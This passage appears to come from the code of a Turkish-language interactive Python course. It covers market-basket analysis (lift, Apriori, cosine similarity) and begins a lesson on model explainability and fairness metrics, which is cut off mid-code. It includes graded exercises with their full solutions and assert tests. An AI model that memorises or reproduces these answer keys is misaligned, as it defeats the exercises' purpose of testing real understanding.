print(kural(sepet, a, b))</pre><p>Kürk Mantolu Madonna alanların yaklaşık %10'u Saatleri Ayarlama Enstitüsü'nü de almış; bu, ikinci kitabın genel yaygınlığının neredeyse iki katı (lift ≈ 1.87). Ama destek yalnızca 7 sepet! Küçük sayılarla kurulan kurallar gürültüye çok açıktır; bu yüzden her kural listesine önce bir <b>en az destek</b> (min support) eşiği uygulanır.</p><h3>Sık ikilileri saymak: Apriori fikri</h3><p>40 ürünle 780 olası ikili, 9880 olası üçlü var; binlerce ürünle bu sayı patlar. Apriori algoritmasının gözlemi basittir: <b>bir küme sık değilse, onu içeren hiçbir büyük küme sık olamaz</b> (anti-monotonluk). O hâlde önce sık tekil ürünleri bul, yalnız onlardan ikili aday üret, sık ikililerden üçlü aday üret ve her adımda budayarak ilerle. Küçük veride <code>itertools.combinations</code> ile doğrudan saymak yeterlidir:</p><pre class="py">from collections import Counter
from itertools import combinations

ciftler = Counter()
for _, g in kalemler.groupby("order_id"):
    for x, y in combinations(sorted(set(g["product_id"])), 2):
        ciftler[(x, y)] += 1

print("farklı ikili:", len(ciftler))
print("en az 5 sepette görülen:", sum(1 for v in ciftler.values() if v &gt;= 5))
for (x, y), n in ciftler.most_common(3):
    print(n, urunler.loc[x, "name"], "+", urunler.loc[y, "name"])</pre><div class="note"><b>Gerçek işte</b>Perakende ekipleri kuralları genellikle kategori ya da marka düzeyinde de hesaplar, çünkü ürün düzeyinde sayılar seyrektir. Anadolu Market verisinde kategori düzeyinde lift değerlerinin hepsi 1'in altında çıkar: müşteriler bir siparişte çoğunlukla aynı kategoriden (iki kitap gibi) alıyor, farklı kategorileri birlikte almıyor. Bu da kendi başına bir içgörüdür: çapraz kategori önerisi için kampanya gerekir, kendiliğinden olmuyor. Üretimde <code>mlxtend</code> (<code>apriori</code>, <code>association_rules</code>) ya da FP-Growth kullanılır; mantık aynıdır.</div><h3>Öğe-öğe benzerliğiyle öneri</h3><p>Sepet matrisinin her sütunu bir ürünün "hangi sepetlerde göründüğü" vektörüdür. İki sütun arasındaki kosinüs benzerliği (cosine similarity), ikili vektörlerde n(A, B) / √(n(A)·n(B)) olur. "Bu ürünü alanlar şunları da aldı" kutusu tam olarak budur: ürünün sütununa en benzer k sütun.</p><pre class="py">import numpy as np

A = sepet.to_numpy().astype(float)
ortak = A.T @ A                          # ürün × ürün birlikte görülme sayıları
norm = np.sqrt(np.diag(ortak))
benzerlik = pd.DataFrame(ortak / np.outer(norm, norm),
                         index=sepet.columns, columns=sepet.columns)

hedef = 15                               # İstatistiğe Giriş
enler = benzerlik[hedef].drop(hedef).sort_values(ascending=False).head(3)
for pid, s in enler.items():
    print(f"{urunler.loc[pid, 'name']:&lt;24} {s:.3f}")</pre><p>Matris çarpımı <code>A.T @ A</code> köşegeninde her ürünün kaç sepette geçtiğini, köşegen dışında ise ikililerin ortak sayısını verir; tek satırda tüm ikili sayımı yapmış olursun. Lift de bu matristen hesaplanabilir: <code>ortak * N / np.outer(n, n)</code>.</p><div class="warn"><b>Popülerlik yanlılığı ve soğuk başlangıç</b>Benzerlik ve güven, çok satan ürünleri her listeye taşır; az satan ürün hiç önerilmez. Ölçüyü lift ya da kosinüsle normalleştir, en az ortak sepet eşiği koy ve önerileri A/B testiyle ölç (istatistik dersi). Hiç satışı olmayan yeni ürün için sepet verisi yoktur; ilk aşamada kategori ve içerik benzerliğine dayanmak gerekir.</div><p>Özetle iş akışı şudur: sepet matrisini kur → en az destek eşiğiyle sık öğe kümelerini bul → güven ve lift ile kuralları sırala → kuralları iş diline çevir ("Kitap alanlara kupa seti kampanyası") → etkisini deneyle ölç.</p>`,
    ex: [
      { t: 'mc',
        stage: 'Isınma',
        q: 'Anadolu Market verisinde "Kürk Mantolu Madonna → Saatleri Ayarlama Enstitüsü" kuralının lift değeri 1.87 çıktı. Bu ne anlama gelir?',
        o: ['İlk kitabı alan müşterilerin %87\'si ikinci kitabı da sepetine ekliyor demektir', 'İlkini alanlarda ikinci kitap, genel oranının 1.87 katı sıklıkta görülüyor', 'Bu iki kitap tüm siparişlerin %1.87\'sinde aynı sepette birlikte görülüyor demektir', 'İkinci kitabı alanların ilkini alma olasılığı 1.87'],
        a: 1,
        why: 'Lift = güven / destek(B): birlikteliğin bağımsızlık durumuna göre kaç kat fazla olduğunu gösterir. %87 güven, %1.87 destek olurdu; olasılık 1\'i aşamaz.' },
      { t: 'mc',
        stage: 'Isınma',
        q: 'Kural listesine neden "en az destek" (min support) eşiği uygulanır?',
        o: ['Lift değerlerini yapay olarak 1\'in üstüne çıkarıp kuralları daha güçlü göstermek için', 'Güven ölçüsünü yönden bağımsız, yani simetrik hâle getirip iki kuralı birleştirmek için', 'Tek sepette görülen nadir ikililer %100 güven ve dev lift alır; eşik bu gürültüyü ayıklar', 'crosstab bool matris döndürsün diye'],
        a: 2,
        why: 'Yalnız bir sepette görülen iki nadir ürün için güven 1.0 ve lift çok büyük çıkar ama bu tesadüftür. En az destek, kuralın yeterince çok sepete dayanmasını şart koşar ve Apriori budamasının da temelidir.' },
      { t: 'predict',
        stage: 'Kodu oku',
        q: 'Beş sepet için kural ölçüleri. Bu kod ne yazdırır?',
        code: 'sepetler = [{"çay", "şeker"}, {"çay", "kupa"}, {"çay", "şeker", "kupa"}, {"kahve"}, {"şeker"}]\nn = len(sepetler)\na, b = "çay", "şeker"\nn_a = sum(a in s for s in sepetler)\nn_b = sum(b in s for s in sepetler)\nn_ab = sum(a in s and b in s for s in sepetler)\nprint(n_ab / n, round(n_ab / n_a, 2), round((n_ab / n_a) / (n_b / n), 2))\n',
        o: ['0.4 0.67 1.11', '0.4 0.67 0.67', '2 0.67 1.11', '0.4 0.5 0.83'],
        a: 0,
        why: 'n_ab = 2 (1. ve 3. sepet), n_a = 3, n_b = 3. Destek 2/5 = 0.4, güven 2/3 ≈ 0.67, lift 0.667 / 0.6 ≈ 1.11.' },
      { t: 'order',
        stage: 'Kodu oku',
        q: '<p>Küçük bir kalem tablosundan sipariş × ürün ikili matrisi kuran ve her ürünün desteğini yazdıran programın satırlarını sırala.</p>',
        lines: ['import pandas as pd', 'k = pd.DataFrame({"order_id": [1, 1, 2, 3, 3], "urun": ["A", "B", "A", "B", "C"]})', 'tablo = pd.crosstab(k["order_id"], k["urun"])', 'sepet = tablo > 0', 'destek = sepet.mean().round(2)', 'print(destek.to_dict())'],
        expect: '{\'A\': 0.67, \'B\': 0.67, \'C\': 0.33}\n',
        needs: ['pandas'],
        hint: 'Önce veri, sonra sayım tablosu, sonra bool matris, en son ortalama.',
        why: 'crosstab sayım verir; > 0 ile var/yok matrisine çevrilir. Bool sütunun ortalaması, o ürünü içeren sepet oranıdır (destek).' },
      { t: 'code',
        id: 'ml-kumeleme-w1',
        stage: 'Rehberli',
        diff: 1,
        needs: ['pandas'],
        q: '<p>Anadolu Market\'in gerçek <code>order_items</code> tablosundan sepet matrisi kur. <code>sepet_matrisi(kalemler)</code> fonksiyonu satırları <code>order_id</code>, sütunları <code>product_id</code> olan, hücreleri <code>True/False</code> (bu sepette bu ürün var mı) olan bir DataFrame döndürsün. Kalemler hazır yüklü.</p>',
        guide: ['pd.crosstab ile order_id × product_id sayım tablosu kur.', 'Sayımı "0\'dan büyük mü" karşılaştırmasıyla bool yap.', 'Sonucu döndür.'],
        example: 'import pandas as pd\nk = pd.DataFrame({"fis": [1, 1, 2], "urun": ["çay", "çay", "kahve"]})\nprint(pd.crosstab(k["fis"], k["urun"]) > 0)\n',
        start: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\n\ndef sepet_matrisi(kalemler):\n    # TODO: crosstab ile sipariş × ürün tablosu\n    # TODO: bool matrise çevir\n    pass\n',
        sol: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\n\ndef sepet_matrisi(kalemler):\n    tablo = pd.crosstab(kalemler["order_id"], kalemler["product_id"])\n    return tablo > 0\n',
        tests: 'm = sepet_matrisi(kalemler)\nassert m.shape == (910, 38), f"910 sipariş × 38 satılmış ürün bekleniyordu, gelen {m.shape}"\nassert m.to_numpy().dtype == bool, "Hücreler True/False olmalı: crosstab sonucunu > 0 ile karşılaştır"\nassert int(m.to_numpy().sum()) == 1620, "Her kalem satırı ayrı bir (sipariş, ürün) çifti; toplam 1620 True olmalı"\nassert bool(m.loc[1, 27]) and bool(m.loc[1, 9]), "1 numaralı siparişte 27 ve 9 numaralı ürünler var"\n',
        hints: ['Çapraz sayım için pandas\'ta hazır bir fonksiyon var.', 'pd.crosstab(satir_serisi, sutun_serisi) sayım verir.', 'return pd.crosstab(kalemler["order_id"], kalemler["product_id"]) > 0'],
        why: 'crosstab her (sipariş, ürün) çiftini sayar; > 0 karşılaştırması onu varlık matrisine çevirir. Aynı ürün bir siparişte iki satırda geçse bile sepet analizinde tek varlık sayılır.' },
      { t: 'code',
        id: 'ml-kumeleme-w2',
        stage: 'Rehberli',
        diff: 2,
        needs: ['pandas'],
        q: '<p><code>kural(m, a, b)</code> fonksiyonunu yaz: bool sepet matrisi <code>m</code> ve iki ürün numarası alıp <code>{"destek": .., "guven": .., "lift": ..}</code> sözlüğü döndürsün (A → B kuralı). Değerleri 4 basamağa yuvarla. Matris gerçek veriden hazır kuruluyor.</p>',
        guide: ['Birlikte görülme: m[a] & m[b] serisinin ortalaması destektir.', 'Güven: destek / m[a].mean().', 'Lift: güven / m[b].mean().', 'Üçünü round(..., 4) ile sözlüğe koy.'],
        example: 'import pandas as pd\nm = pd.DataFrame({"x": [True, True, False], "y": [True, False, False]})\nprint((m["x"] & m["y"]).mean(), m["x"].mean())\n',
        start: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\nm = pd.crosstab(kalemler["order_id"], kalemler["product_id"]) > 0\n\ndef kural(m, a, b):\n    # TODO: destek, güven, lift\n    return {}\n',
        sol: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\nm = pd.crosstab(kalemler["order_id"], kalemler["product_id"]) > 0\n\ndef kural(m, a, b):\n    destek = (m[a] & m[b]).mean()\n    guven = destek / m[a].mean()\n    lift = guven / m[b].mean()\n    return {"destek": round(float(destek), 4), "guven": round(float(guven), 4), "lift": round(float(lift), 4)}\n',
        tests: 'r = kural(m, 10, 13)\nassert r["destek"] == 0.0077, f"10 ve 13 birlikte 7 sepette: 7/910 = 0.0077 olmalı, gelen {r[\'destek\']}"\nassert r["guven"] == 0.1029, f"10 numaralı ürün 68 sepette; güven 7/68 = 0.1029 olmalı, gelen {r[\'guven\']}"\nassert r["lift"] == 1.8735, f"lift = güven / destek(13) = 1.8735 olmalı, gelen {r[\'lift\']}"\nr2 = kural(m, 13, 10)\nassert r2["lift"] == r["lift"], "Lift simetriktir: A→B ve B→A aynı çıkmalı"\nassert r2["guven"] != r["guven"], "Güven yöne bağlıdır: payda n(A) değişir"\n',
        hints: ['Bool serinin ortalaması True oranıdır.', 'İki sütunu & ile birleştir: (m[a] & m[b]).mean()', 'lift = guven / m[b].mean()'],
        why: 'Destek ortak oran, güven A\'ya koşullu oran, lift ise güvenin B\'nin kendi yaygınlığına oranıdır. Lift simetrik, güven yönlüdür.' },
      { t: 'code',
        id: 'ml-kumeleme-w3',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p><code>sik_ciftler(kalemler, min_adet=5)</code> fonksiyonunu yaz: her siparişteki <b>farklı</b> ürünlerin tüm ikililerini say (ikili küçük numara önce: <code>(10, 13)</code>), en az <code>min_adet</code> sepette görülenleri <code>[((a, b), adet), ...]</code> listesi olarak döndür. Sıralama: adet büyükten küçüğe, eşitlikte ikili küçükten büyüğe. Ürün numaraları düz <code>int</code> olsun.</p>',
        start: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\n\ndef sik_ciftler(kalemler, min_adet=5):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\nfrom collections import Counter\nfrom itertools import combinations\n\ndef sik_ciftler(kalemler, min_adet=5):\n    sayac = Counter()\n    for _, g in kalemler.groupby("order_id"):\n        urunler = sorted({int(u) for u in g["product_id"]})\n        for ikili in combinations(urunler, 2):\n            sayac[ikili] += 1\n    sonuc = [(p, n) for p, n in sayac.items() if n >= min_adet]\n    return sorted(sonuc, key=lambda t: (-t[1], t[0]))\n',
        tests: 'r = sik_ciftler(kalemler)\nassert r[0] == ((10, 13), 7), f"En sık ikili (10, 13) ve 7 sepet olmalı, gelen {r[0]}"\nassert len(r) == 22, f"En az 5 sepette görülen 22 ikili var, gelen {len(r)}"\nassert r == [((10, 13), 7), ((11, 13), 6), ((15, 18), 6), ((15, 19), 6), ((15, 27), 6), ((35, 37), 6), ((3, 19), 5), ((4, 26), 5), ((4, 35), 5), ((9, 32), 5), ((9, 35), 5), ((10, 20), 5), ((10, 28), 5), ((11, 12), 5), ((11, 31), 5), ((11, 39), 5), ((13, 20), 5), ((13, 27), 5), ((13, 31), 5), ((18, 28), 5), ((34, 37), 5), ((35, 39), 5)], "Sıralama: adet azalan, eşitlikte ikili artan"\nassert len(sik_ciftler(kalemler, 7)) == 1, "min_adet=7 ile yalnız bir ikili kalır"\nassert all(type(a) is int for (a, b), n in r), "Ürün numaraları int olmalı"\n',
        hints: ['groupby("order_id") ile her sepeti gez; ikilileri itertools.combinations üretir.', 'combinations(sorted(set(...)), 2) ikilileri hep küçük-büyük sırasıyla verir; Counter ile say.', 'sorted(..., key=lambda t: (-t[1], t[0]))'],
        why: 'Sıralı küme üzerinde combinations her ikiliyi tek biçimde üretir (aynı ikili iki farklı sırayla sayılmaz). Eksi adet ile azalan, ikili ile artan sıralama tek anahtarda birleşir.' },
      { t: 'code',
        id: 'ml-kumeleme-w4',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['pandas'],
        q: '<p>"Bunu alanlar şunları da aldı" kutusu için <code>benzer_urunler(m, urun, k=3)</code> yaz. <code>m</code> bool sepet matrisi (hazır). Hedef ürün sütunuyla diğer her sütun arasındaki kosinüs benzerliğini hesapla: <code>n(A, B) / sqrt(n(A) * n(B))</code>. Benzerliği 4 basamağa yuvarla; büyükten küçüğe, eşitlikte ürün numarası küçük olan önce gelecek şekilde ilk <code>k</code> ürün numarasını (<code>int</code>) liste olarak döndür. Ürünün kendisi listede olmasın.</p>',
        start: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\nm = pd.crosstab(kalemler["order_id"], kalemler["product_id"]) > 0\n\ndef benzer_urunler(m, urun, k=3):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\nimport math\nm = pd.crosstab(kalemler["order_id"], kalemler["product_id"]) > 0\n\ndef benzer_urunler(m, urun, k=3):\n    hedef = m[urun]\n    n_a = hedef.sum()\n    puanlar = []\n    for diger in m.columns:\n        if diger == urun:\n            continue\n        ortak = (hedef & m[diger]).sum()\n        s = round(ortak / math.sqrt(n_a * m[diger].sum()), 4)\n        puanlar.append((-s, int(diger)))\n    puanlar.sort()\n    return [u for _, u in puanlar[:k]]\n',
        tests: 'assert benzer_urunler(m, 13) == [10, 11, 20], "13 (Saatleri Ayarlama Enstitüsü) için en benzer üç ürün [10, 11, 20] olmalı"\nassert benzer_urunler(m, 15, 4) == [18, 27, 19, 2], "15 (İstatistiğe Giriş) için ilk dört: [18, 27, 19, 2]"\nassert 35 not in benzer_urunler(m, 35, 5), "Ürün kendine önerilmemeli"\nassert all(type(u) is int for u in benzer_urunler(m, 35)), "Ürün numaraları int olmalı"\n',
        hints: ['Her sütun bir ürünün sepet vektörüdür; ortak sayı iki sütunun & işleminin toplamıdır.', '(m[a] & m[b]).sum() / math.sqrt(m[a].sum() * m[b].sum())', 'Eksi puan ve ürün numarasından oluşan demetleri sıralarsan iki ölçüt birden uygulanır.'],
        why: 'İkili vektörlerde iç çarpım ortak sepet sayısı, norm ise sepet sayısının kareköküdür. Kosinüs, popüler ürünlerin yalnızca çok satıldığı için öne çıkmasını kısmen dengeler.' },
      { t: 'code',
        id: 'ml-kumeleme-w5',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        q: '<p>Hatayı bul ve düzelt. <code>kurallar(sepetler, min_adet)</code> en az <code>min_adet</code> sepette birlikte görülen her ikili için iki yönlü kuralları <code>(a, b, guven, lift)</code> olarak (2 basamak) döndürmeli, lift\'e göre azalan sıralı. Ama lift değerleri yanlış çıkıyor ve iki yön aynı lift\'i vermiyor; ayrıca eşik bir eksik sayıyla uygulanıyor.</p>',
        start: 'from collections import Counter\nfrom itertools import combinations\n\ndef kurallar(sepetler, min_adet):\n    n = len(sepetler)\n    tek = Counter(u for s in sepetler for u in set(s))\n    cift = Counter(p for s in sepetler for p in combinations(sorted(set(s)), 2))\n    sonuc = []\n    for (x, y), nxy in cift.items():\n        if nxy > min_adet:\n            for a, b in ((x, y), (y, x)):\n                guven = nxy / tek[a]\n                lift = guven / (tek[a] / n)\n                sonuc.append((a, b, round(guven, 2), round(lift, 2)))\n    return sorted(sonuc, key=lambda r: (-r[3], r[0], r[1]))\n',
        sol: 'from collections import Counter\nfrom itertools import combinations\n\ndef kurallar(sepetler, min_adet):\n    n = len(sepetler)\n    tek = Counter(u for s in sepetler for u in set(s))\n    cift = Counter(p for s in sepetler for p in combinations(sorted(set(s)), 2))\n    sonuc = []\n    for (x, y), nxy in cift.items():\n        if nxy >= min_adet:\n            for a, b in ((x, y), (y, x)):\n                guven = nxy / tek[a]\n                lift = guven / (tek[b] / n)\n                sonuc.append((a, b, round(guven, 2), round(lift, 2)))\n    return sorted(sonuc, key=lambda r: (-r[3], r[0], r[1]))\n',
        tests: 'S = [["çay", "şeker"], ["çay", "kupa"], ["çay", "şeker", "kupa"], ["kahve"], ["şeker"], ["kahve", "kupa"]]\nr = kurallar(S, 2)\nassert ("çay", "şeker", 0.67, 1.33) in r, f"çay→şeker: güven 2/3, lift (2/3)/(3/6)=1.33 olmalı; gelen {r}"\nassert ("şeker", "çay", 0.67, 1.33) in r, "Lift simetrik: şeker→çay da 1.33 olmalı"\nassert len(r) == 4, f"min_adet=2: 2 sepette görülen (çay, şeker) ve (çay, kupa) ikilileri, iki yönle 4 kural; gelen {len(r)}"\nassert kurallar(S, 3) == [], "3 sepette birlikte görülen ikili yok"\n',
        hints: ['Lift\'in paydası sonuç ürününün (b) desteğidir.', 'Eşik "en az" demek: >= kullan.'],
        why: 'lift = güven(A→B) / destek(B). Paydada A\'nın desteği kalırsa ölçü yönlü olur ve anlamını yitirir. "En az" eşikleri >= ile yazılır.' },
      { t: 'code',
        id: 'ml-kumeleme-w6',
        stage: 'Meydan okuma',
        diff: 3,
        needs: ['pandas'],
        q: '<p>Apriori\'yi yaz. <code>apriori(sepetler, min_adet, en_buyuk=3)</code>: <code>sepetler</code> küme listesi. Sık öğe kümelerini <code>{frozenset: adet}</code> sözlüğü olarak döndür (boyut 1\'den <code>en_buyuk</code>\'a kadar). Kural: k boyutlu adaylar yalnız sık (k-1) boyutlu kümelerin birleşiminden üretilsin ve <b>tüm (k-1) alt kümesi sık olmayan aday sayılmadan elensin</b>. Testler küçük örnekte ve gerçek <code>order_items</code> sepetlerinde (min_adet=5) çalışır.</p>',
        start: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\nsepetler = [set(g) for _, g in kalemler.groupby("order_id")["product_id"]]\n\ndef apriori(sepetler, min_adet, en_buyuk=3):\n    pass\n',
        sol: 'import veri\nimport pandas as pd\nkalemler = veri.oku("anadolu_market", "order_items")\nfrom itertools import combinations\nsepetler = [set(g) for _, g in kalemler.groupby("order_id")["product_id"]]\n\ndef apriori(sepetler, min_adet, en_buyuk=3):\n    sayac = {}\n    for s in sepetler:\n        for u in s:\n            k = frozenset([u])\n            sayac[k] = sayac.get(k, 0) + 1\n    sik = {k: v for k, v in sayac.items() if v >= min_adet}\n    sonuc = dict(sik)\n    boyut = 2\n    while sik and boyut <= en_buyuk:\n        onceki = list(sik)\n        adaylar = set()\n        for i in range(len(onceki)):\n            for j in range(i + 1, len(onceki)):\n                b = onceki[i] | onceki[j]\n                if len(b) == boyut and all(frozenset(alt) in sik for alt in combinations(b, boyut - 1)):\n                    adaylar.add(b)\n        sayac = {a: sum(1 for s in sepetler if a <= s) for a in adaylar}\n        sik = {k: v for k, v in sayac.items() if v >= min_adet}\n        sonuc.update(sik)\n        boyut += 1\n    return sonuc\n',
        tests: 'S = [{"a", "b", "c"}, {"a", "b"}, {"a", "c"}, {"b", "c"}, {"a", "b", "c"}, {"d"}]\nr = apriori(S, 2)\nassert r[frozenset("ab")] == 3 and r[frozenset("abc")] == 2, "ab 3 sepette, abc 2 sepette"\nassert frozenset("d") not in r, "d yalnız 1 sepette; min_adet=2 ile elenmeli"\nassert len(r) == 7, f"a, b, c, ab, ac, bc, abc = 7 sık küme; gelen {len(r)}"\ng = apriori(sepetler, 5)\nassert sum(1 for k in g if len(k) == 2) == 22, \'Gerçek veride en az 5 sepette görülen 22 ikili var\'\nassert max(len(k) for k in g) == 2, \'Gerçek veride 5 sepete ulaşan üçlü yok\'\nassert g[frozenset([10, 13])] == 7, \'(10, 13) ikilisi 7 sepette\'\n',
        hints: ['Önce tekil sayım, sonra döngüde boyutu bir artırarak ilerle.', 'Aday = iki sık kümenin birleşimi ve boyutu tam k; combinations(aday, k-1) ile alt kümeleri kontrol et.', 'Adayı saymak için alt küme testi: aday <= sepet.'],
        why: 'Anti-monotonluk sayesinde sık olmayan kümenin üst kümeleri hiç sayılmaz; adayların küçük tutulması algoritmanın büyük veride çalışmasını sağlar.' }
    ],
    faq: [
      { q: 'Apriori\'yi her seferinde kendim mi yazmalıyım?',
        a: 'Hayır. Üretimde <code>mlxtend.frequent_patterns</code> (<code>apriori</code>, <code>fpgrowth</code>, <code>association_rules</code>) ya da Spark MLlib\'in <code>FPGrowth</code> sınıfı kullanılır (<code>pip install mlxtend</code>). Kendin yazmak ölçülerin ve budamanın mantığını anlamak içindir; kütüphanenin sonuçlarını da böylece denetleyebilirsin.' },
      { q: 'Sepet analizi ile öneri sistemi aynı şey mi?',
        a: 'Akrabadırlar. Sepet kuralları "aynı siparişte birlikte" ilişkisini, öğe-öğe benzerliği ise aynı mantığı vektörlerle kullanır. Tam öneri sistemleri müşteri geçmişini, zamanı ve içerik bilgisini de kullanır (matris ayrıştırma, iki kuleli modeller). Küçük bir e-ticarette bu bölümdeki yöntem iyi bir başlangıçtır ve A/B testiyle ölçülmelidir.' }
    ],
    mistakes: [
      { bad: 'lift = guven / destek_a',
        good: 'lift = guven / destek_b',
        why: 'Lift\'in paydası sonuç ürününün (B) desteğidir; A\'ya bölersen ölçü simetrisini ve anlamını kaybeder.' }
    ] }
);
})(window);
/* Kesit Python — 'ml-pipeline-degerlendirme' dersi uzantısı: açıklanabilirlik (PDP/ICE, permutation importance), hata dilimi, adalet metrikleri ve arama bütçesi (AUDIT Ekle-5, Ekle-6) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  { id: 'ml-pipeline-degerlendirme',
    min: 30,
    html: `<h2>Derinleş: modeli açıklamak, adil olup olmadığını ölçmek, aramayı hızlandırmak</h2><p>Skor tablosu "model ne kadar iyi?" sorusunu cevaplar; iş ekibi ise "neden bu kişiyi riskli buldu, kimde yanılıyor, herkese eşit davranıyor mu?" diye sorar. Bu bölümde Pusula İK'nın gerçek çalışan verisiyle (<code>pusula_ik</code>, 2199 çalışan) <b>gönüllü ayrılma</b> modeli kuracak, sonra onu açıklayacak ve denetleyeceksin. Etiket: <code>term_type == "gönüllü"</code> (yaklaşık %27). Cinsiyet modele <b>özellik olarak verilmiyor</b>; yalnızca adalet denetiminde kullanılıyor.</p><pre class="py">import veri
import pandas as pd

def ik_verisi():
    e = veri.oku("pusula_ik", "ik_employees")
    p = veri.oku("pusula_ik", "ik_positions")
    d = e.merge(p[["position_id", "level"]], on="position_id")
    d["ise_giris_yasi"] = (pd.to_datetime(d["hire_date"]).dt.year - d["birth_year"]).astype(float)
    d["level"] = d["level"].astype(float)
    y = (d["term_type"] == "gönüllü").astype(int)
    X = d[["ise_giris_yasi", "level", "education", "city", "work_mode", "hire_source"]]
    return X, y, d["gender"]

from sklearn.model_selection import train_test_split
from sklearn.compose import ColumnTransformer
from sklearn.preprocessing import OneHotEncoder
from sklearn.pipeline import Pipeline
from sklearn.linear_model import LogisticRegression

X, y, cinsiyet = ik_verisi()
X_tr, X_te, y_tr, y_te, g_tr, g_te = train_test_split(
    X, y, cinsiyet, test_size=0.3, random_state=0, stratify=y)
kategorik = ["education", "city", "work_mode", "hire_source"]
on_isleme = ColumnTransformer(
    [("kat", OneHotEncoder(handle_unknown="ignore"), kategorik)], remainder="passthrough")
model = Pipeline([("on", on_isleme), ("model", LogisticRegression(max_iter=1000))])
model.fit(X_tr, y_tr)
from sklearn.metrics import roc_auc_score
print("test ROC-AUC:", round(roc_auc_score(y_te, model.predict_proba(X_te)[:, 1]), 3))</pre><p>AUC'nin 0.6 civarında olması gerçekçi: işe girişte bilinen birkaç özellik, kimin ayrılacağını ancak kısmen açıklar. Böyle bir modeli canlıya almadan önce aşağıdaki dört soruyu sormak zorundasın.</p><h3>1) Hangi özellik önemli? Permutation importance</h3><p>Fikir: bir sütunu karıştır (satırlar arasında rastgele yer değiştir), modeli yeniden eğitmeden skoru ölç. Skor ne kadar düşerse model o sütuna o kadar dayanıyordur. Ağaçların <code>feature_importances_</code> değerinden farkı: <b>test verisinde</b> ve seçtiğin metrikle ölçülür, her model türünde çalışır ve çok değerli (yüksek kardinaliteli) sütunlara karşı yanlı değildir. Pipeline'a ham sütunları verdiğin için önem de ham sütun düzeyinde çıkar.</p><pre class="py">from sklearn.inspection import permutation_importance

r = permutation_importance(model, X_te, y_te, scoring="roc_auc", n_repeats=5, random_state=0)
onem = pd.Series(r.importances_mean, index=X_te.columns).sort_values(ascending=False)
print(onem.round(4))</pre><div class="warn"><b>İlişkili sütun tuzağı</b>İki sütun aynı bilgiyi taşıyorsa (pozisyon seviyesi ve maaş bandı gibi) birini karıştırınca model diğerinden telafi eder ve ikisi de "önemsiz" görünür. Önem değeri nedensellik de değildir: "seviyeyi yükseltirsek çalışan kalır" sonucu buradan çıkmaz.</div><h3>2) Etki hangi yönde? PDP ve ICE</h3><p>Kısmi bağımlılık (partial dependence, PDP) tek bir özelliği sırayla her değere sabitler, tüm satırlar için tahmin alır ve ortalamasını çizer: "diğer her şey veri gibiyken seviye 1'den 6'ya çıkınca ortalama ayrılma olasılığı nasıl değişir?" ICE (individual conditional expectation) aynı hesabı ortalama almadan, <b>her satır için ayrı çizgi</b> olarak gösterir; çizgiler birbirine paralel değilse etkileşim vardır.</p><pre class="py">from sklearn.inspection import partial_dependence

pdp = partial_dependence(model, X_tr, ["level"], kind="both")
print("ızgara:", pdp["grid_values"][0])
print("PDP   :", pdp["average"][0].round(3))
print("ICE boyutu:", pdp["individual"].shape)    # (çıktı, satır, ızgara)</pre><p>Grafiği <code>PartialDependenceDisplay.from_estimator(model, X_tr, ["level"], kind="both")</code> ile çizersin. Tamsayı sütunlar için scikit-learn uyarı verir; sütunu önceden <code>float</code> yapmamızın nedeni bu. SHAP değerleri ise her tahmini özellik katkılarına böler ("bu çalışanın riskini en çok seviyesi artırdı"); <code>pip install shap</code> ile kendi bilgisayarında dene:</p><pre class="code">import shap
ozellik = model[:-1].transform(X_te)
aciklayici = shap.LinearExplainer(model[-1], ozellik)
degerler = aciklayici(ozellik)
shap.plots.beeswarm(degerler)        # genel tablo
shap.plots.waterfall(degerler[0])    # tek çalışan için açıklama</pre><h3>3) Kimde yanılıyor? Hata dilimi analizi</h3><p>Ortalama hata, küçük bir segmentte çok kötü çalışmayı gizler. Test tahminlerini segmentlere (şehir, çalışma biçimi, işe alım kaynağı) göre grupla; her segment için satır sayısı ve hata oranı çıkar, en kötüden iyiye sırala. Çok küçük segmentleri (ör. 30 satırdan az) ayrı işaretle; orada gördüğün fark gürültü olabilir.</p><pre class="py">tahmin = (model.predict_proba(X_te)[:, 1] &gt;= 0.3).astype(int)
dilim = X_te.assign(hata=(tahmin != y_te.to_numpy()))
tablo = dilim.groupby("city")["hata"].agg(n="size", hata_orani="mean")
print(tablo.sort_values("hata_orani", ascending=False).round(3))</pre><h3>4) Herkese eşit mi? Grup bazında metrikler</h3><div class="tbl-wrap"><table><tr><th>Metrik</th><th>Grup başına hesap</th><th>İK örneğinde soru</th></tr><tr><td>Seçim oranı (demographic parity)</td><td>tahmin = 1 oranı</td><td>Kadınların ne kadarı "riskli" işaretleniyor?</td></tr><tr><td>FPR (yanlış alarm)</td><td>FP / (FP + TN)</td><td>Kalacak çalışanların ne kadarına gereksiz müdahale ediliyor?</td></tr><tr><td>FNR (kaçırma, equal opportunity)</td><td>FN / (FN + TP)</td><td>Ayrılacak çalışanların ne kadarı gözden kaçıyor?</td></tr></table></div><pre class="py">def oranlar(s):
    fp = ((s.tahmin == 1) &amp; (s.y == 0)).sum(); tn = ((s.tahmin == 0) &amp; (s.y == 0)).sum()
    fn = ((s.tahmin == 0) &amp; (s.y == 1)).sum(); tp = ((s.tahmin == 1) &amp; (s.y == 1)).sum()
    return pd.Series({"secim": s.tahmin.mean(), "fpr": fp / (fp + tn), "fnr": fn / (fn + tp)})

grup = pd.DataFrame({"y": y_te.to_numpy(), "tahmin": tahmin, "cinsiyet": g_te.to_numpy()})
